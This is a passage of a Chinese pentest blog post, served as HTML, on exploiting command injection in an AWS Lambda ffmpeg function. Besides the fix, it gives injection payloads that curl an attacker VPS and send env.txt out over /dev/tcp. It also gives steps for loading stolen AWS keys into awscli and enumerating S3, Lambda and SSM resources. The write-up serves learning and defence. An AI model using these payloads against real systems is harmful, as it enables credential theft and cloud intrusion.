@@ -1,0 +1,354 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Lambda远程命令执行测试 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="漏洞测试的时候发现AWS的Lambda里面有这样的代码，可以很明显的看出来存在命令注入：
+execute_command = &#34;ffmpeg -i &#34; + video_url + &#34; -y -f &#34; + img_format + &#34; -ss &#34; + time_index + &#34; -vframes 1 &#34; + WH + &#34; &#34; + output_path
+print(execute_command)
+cp = subprocess.run(execute_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+攻击的Payload： ;curl &amp;lt;your vps&amp;gt;:&amp;lt;port&amp;gt;;，然后在自己服务器监听可以收到Lambda容器发起的请求。
+修复代码:cp = subprocess.run([&#34;ffmpeg&#34;, &#34;-i&#34;, video_url, &#34;-y&#34;, &#34;-f&#34;, img_format, &#34;-ss&#34;, time_index, &#34;-vframes&#34;, &#34;1&#34;, output_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+
+储备知识
+Lambda函数代码路径: /var/task
+用户凭证: 存储在环境变量里面，AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
+文件系统: /var/task只读，/tmp可写
+默认用户: sbx_userxxx
+Lambda计算的最大超时时间是15分钟，凭证过期时间是11个小时左右
+攻击Lambda只需要获取AK、SK、Token，反弹shell没什么意义
+
+在存在命令执行的情况下先获取用户凭证，然后使用awscli写入本地配置文件里面，通过awscli来操作，如果在创建Lambda的权限控制不足，这个时候就可以使用awscli来操作各种资源，比如我发现的命令执行有对主账户下所有网卡的操作权限，可以使用获取到的用户凭证删除所有网卡接口。
+存在另外一种情况，当获取到的凭证权限很小的时候，到处都是is not authorized to perform，可以通过以下查询来查看自己的凭证都什么权限，首先配置命令行工具："> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Lambda远程命令执行测试"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Lambda远程命令执行测试</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>测试的时候发现AWS的Lambda里面有这样的代码，可以很明显的看出来存在命令注入：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">execute_command <span class="token operator">=</span> <span class="token string">"ffmpeg -i "</span> <span class="token operator">+</span> video_url <span class="token operator">+</span> <span class="token string">" -y -f "</span> <span class="token operator">+</span> img_format <span class="token operator">+</span> <span class="token string">" -ss "</span> <span class="token operator">+</span> time_index <span class="token operator">+</span> <span class="token string">" -vframes 1 "</span> <span class="token operator">+</span> WH <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> output_path
+<span class="token keyword">print</span><span class="token punctuation">(</span>execute_command<span class="token punctuation">)</span>
+cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>execute_command<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>攻击的Payload： <code>;curl &lt;your vps&gt;:&lt;port&gt;;</code>，然后在自己服务器监听可以收到Lambda容器发起的请求。</p>
+<h5 id="修复代码"><a href="#修复代码" class="headerlink" title="修复代码:"></a>修复代码:</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"ffmpeg"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">,</span> video_url<span class="token punctuation">,</span> <span class="token string">"-y"</span><span class="token punctuation">,</span> <span class="token string">"-f"</span><span class="token punctuation">,</span> img_format<span class="token punctuation">,</span> <span class="token string">"-ss"</span><span class="token punctuation">,</span> time_index<span class="token punctuation">,</span> <span class="token string">"-vframes"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> output_path<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h3 id="储备知识"><a href="#储备知识" class="headerlink" title="储备知识"></a>储备知识</h3><ul>
+<li>Lambda函数代码路径: <code>/var/task</code></li>
+<li>用户凭证: 存储在环境变量里面，<code>AWS_ACCESS_KEY_ID</code>, <code>AWS_SECRET_ACCESS_KEY</code>, <code>AWS_SESSION_TOKEN</code></li>
+<li>文件系统: <code>/var/task</code>只读，<code>/tmp</code>可写</li>
+<li>默认用户: <code>sbx_userxxx</code></li>
+<li>Lambda计算的最大超时时间是15分钟，凭证过期时间是11个小时左右</li>
+<li>攻击Lambda只需要获取AK、SK、Token，反弹shell没什么意义</li>
+</ul>
+<p>在存在命令执行的情况下先获取用户凭证，然后使用<code>awscli</code>写入本地配置文件里面，通过<code>awscli</code>来操作，如果在创建<code>Lambda</code>的权限控制不足，这个时候就可以使用<code>awscli</code>来操作各种资源，比如我发现的命令执行有对主账户下所有网卡的操作权限，可以使用获取到的用户凭证删除所有网卡接口。</p>
+<p>存在另外一种情况，当获取到的凭证权限很小的时候，到处都是<code>is not authorized to perform</code>，可以通过以下查询来查看自己的凭证都什么权限，首先配置命令行工具：</p>
+<h6 id="配置aws命令行工具"><a href="#配置aws命令行工具" class="headerlink" title="配置aws命令行工具"></a>配置aws命令行工具</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws configure --profile stolencreds
+输入获取到的AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY和对应区域，编辑~/.aws/credentials，在配置文件里面增加aws_session_token，设置获取到的对应值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/2021/04/01/aws-lambda-rce/aws2.png"></p>
+<h6 id="获取function-name、role-name"><a href="#获取function-name、role-name" class="headerlink" title="获取function name、role name"></a>获取function name、role name</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws sts get-caller-identity --profile stolencreds  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>ARN(Amazon Resource Name)是AWS里面唯一资源标示符号，ARN的格式取决于特定的资源，一般是这种格式：</p>
+<pre class="line-numbers language-none"><code class="language-none">arn:partition:service:region:account-id:resource-id
+arn:partition:service:region:account-id:resource-type&#x2F;resource-id
+arn:partition:service:region:account-id:resource-type:resource-id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li><code>partition</code>：资源所在分区<ul>
+<li><code>aws</code> - AWS 区域</li>
+<li><code>aws-cn</code> - 中国区域</li>
+<li><code>aws-us-gov</code> - AWS GovCloud (US) 区域</li>
+</ul>
+</li>
+<li><code>service</code>: 标识 AWS 产品的服务命名空间。例如，s3 表示 Amazon S3 资源。</li>
+<li><code>region</code>: 区域。例如，us-east-2 表示 美国东部（俄亥俄州）。</li>
+<li><code>account-id</code>: 拥有资源的 AWS 账户的 ID（不含连字符）。例如，123456789012。</li>
+<li><code>resource-id</code>: 资源标识符。ARN 的这一部分可以是资源的名称或 ID，也可以是资源路径. 例如，<code>user/Bob</code>表示 IAM 用户.</li>
+</ul>
+<p>在Lambda里面，ARN的格式是如下这样的表示：<code>arn:aws:sts::&#123;AccountID&#125;:assumed-role/&#123;RoleName&#125;/&#123;FunctionName&#125;</code></p>
+<p><img src="/2021/04/01/aws-lambda-rce/aws.png"></p>
+<h6 id="获取函数的权限明细"><a href="#获取函数的权限明细" class="headerlink" title="获取函数的权限明细"></a>获取函数的权限明细</h6><pre class="line-numbers language-none"><code class="language-none">aws lambda get-policy --function-name &lt;function name&gt;  --output text <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h6 id="获取attach的权限明细"><a href="#获取attach的权限明细" class="headerlink" title="获取attach的权限明细"></a>获取attach的权限明细</h6><pre class="line-numbers language-none"><code class="language-none">aws iam list-attached-role-policies --role-name &lt;role name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h6 id="获取policy-name"><a href="#获取policy-name" class="headerlink" title="获取policy name"></a>获取policy name</h6><pre class="line-numbers language-none"><code class="language-none">aws iam list-role-policies --role-name &lt;role name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h6 id="获取用户凭证的权限明细"><a href="#获取用户凭证的权限明细" class="headerlink" title="获取用户凭证的权限明细"></a>获取用户凭证的权限明细</h6><pre class="line-numbers language-none"><code class="language-none">aws iam get-role-policy --role-name &lt;role name&gt; --policy-name &lt;policy name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>通过查询用户凭证的权限明细，就可以根据获取到的凭证操作AWS的资源，比如S3、EC2。这里的用户凭证权限明细不包括attach的权限</p>
+<h6 id="常用的查询"><a href="#常用的查询" class="headerlink" title="常用的查询"></a>常用的查询</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws lambda list-functions --profile stolencreds
+aws ssm describe-instance-information --profile stolencreds
+aws s3 <span class="token function">ls</span> --profile stolencreds
+aws lambda get-function --function-name FatVideoFrameFFmpeg --query <span class="token string">'Code.Location'</span> --profile stolencreds
+<span class="token function">wget</span> -O lambda-function.zip url-from-previous-query --profile stolencreds
+aws ec2 describe-network-interfaces<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="疑难问题"><a href="#疑难问题" class="headerlink" title="疑难问题"></a>疑难问题</h3><ol>
+<li><p>当确定存在命令执行的时候，先使用了<code>wget</code>，查看<code>cloudwatch</code>之后发现不存在这个命令，当我使用<a target="_blank" rel="noopener" href="https://github.com/pumasecurity/serverless-prey">serverleess-prey</a>测试的时候发现<code>curl</code>都不存在。这时候可以使用<code>;cat /tmp/env.txt &gt; /dev/tcp/&lt;vps&gt;/&lt;port&gt;;</code>来传输数据，先把需要获取到的内容写入到文件，然后外带传输。</p>
+</li>
+<li><p>另外一个隐患是DoW（Denial of Wallet），因为Lambda是按照函数调用次数付费的，所以如果找到一个Lambda的事件触发器，一般是一个http请求，发起大量请求消耗资源, 延伸一下腾讯在推的类似一个业务在github上有很多开源项目 :( 。AWS可以再加一层<code>cloudfront</code>，然后配合<code>cloudwatch</code>或者账单预警来完善，或者添加用户认证token。</p>
+</li>
+<li><p>为什么上面我没有提命令执行之后反弹shell呢？因为一反弹成功之后马上断开。最后在Lambda的配置里面发现Lambda执行的timeout是3s，lambda在建立的时候默认运行时间是3s，可以修改为最大15分钟。</p>
+</li>
+<li><p>还有一种攻击手法，可以修改代码运行环境，没看太懂: <a target="_blank" rel="noopener" href="https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/">Gaining Persistency on Vulnerable Lambdas
+</a></p>
+</li>
+</ol>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/duF1Z0EDC3n_G378Aq_XYA">针对AWS Lambda的运行时攻击</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIyODYzNTU2OA==&mid=2247488798&idx=1&sn=485e2131f347ff4d8c3b5b3286b36c97&scene=21#wechat_redirect">Serverless安全研究 — Serverless安全风险</a></li>
+<li><a target="_blank" rel="noopener" href="https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/">Gaining Persistency on Vulnerable Lambdas</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed">Getting shell and data access in AWS by chaining vulnerabilities</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/zh_cn/general/latest/gr/aws-arns-and-namespaces.html">aws-arns-and-namespaces</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2021/04/01/aws-lambda-rce.html" class="leancloud-visitors view" data-flag-title="Lambda远程命令执行测试">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2021/04/06/defense-from-c2.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/01/04/CloudFront-find-cobaltstrike.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-04-01 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toc-article-text">漏洞</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81"><span class="toc-article-text">修复代码:</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%82%A8%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="toc-article-text">储备知识</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E9%85%8D%E7%BD%AEaws%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7"><span class="toc-article-text">配置aws命令行工具</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96function-name%E3%80%81role-name"><span class="toc-article-text">获取function name、role name</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0%E7%9A%84%E6%9D%83%E9%99%90%E6%98%8E%E7%BB%86"><span class="toc-article-text">获取函数的权限明细</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96attach%E7%9A%84%E6%9D%83%E9%99%90%E6%98%8E%E7%BB%86"><span class="toc-article-text">获取attach的权限明细</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96policy-name"><span class="toc-article-text">获取policy name</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%87%AD%E8%AF%81%E7%9A%84%E6%9D%83%E9%99%90%E6%98%8E%E7%BB%86"><span class="toc-article-text">获取用户凭证的权限明细</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E6%9F%A5%E8%AF%A2"><span class="toc-article-text">常用的查询</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%96%91%E9%9A%BE%E9%97%AE%E9%A2%98"><span class="toc-article-text">疑难问题</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-article-text">参考链接</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
